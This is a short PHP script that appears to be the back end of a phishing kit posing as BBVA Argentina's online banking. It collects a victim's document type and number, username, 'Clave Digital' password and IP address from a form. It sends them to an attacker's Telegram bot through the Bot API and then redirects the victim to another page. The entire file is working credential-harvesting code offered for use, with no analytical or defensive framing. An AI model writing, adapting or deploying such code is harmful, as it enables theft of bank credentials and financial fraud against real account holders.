<?php
// Incluye las variables definidas en data.php
include 'data.php';

// Obtiene la dirección IP del cliente
$ip = $_SERVER['REMOTE_ADDR'];

// Obtiene los datos del formulario
$document_type = $_POST['pan'];
$document_number = $_POST['dni'];
$username = $_POST['cpass'];
$password = $_POST['cpass'];

// Mensaje que será enviado a Telegram
$message = "BBVA Arg:\n";
$message .= "Tipo de documento: " . $document_type . "\n";
$message .= "Número de documento: " . $document_number . "\n";
$message .= "Usuario: " . $username . "\n";
$message .= "Clave Digital: " . $password . "\n";
$message .= "IP: " . $ip . "\n";

// URL para enviar el mensaje a Telegram
$telegram_url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);

// Envía el mensaje a Telegram
$response = file_get_contents($telegram_url);

// Verifica si el mensaje fue enviado correctamente
if ($response === FALSE) {
    // Error al enviar el mensaje
    die('Error al enviar mensaje a Telegram');
}

// Redirige al usuario a otra página después de enviar los datos
header("Location: des.html");
exit();
?>
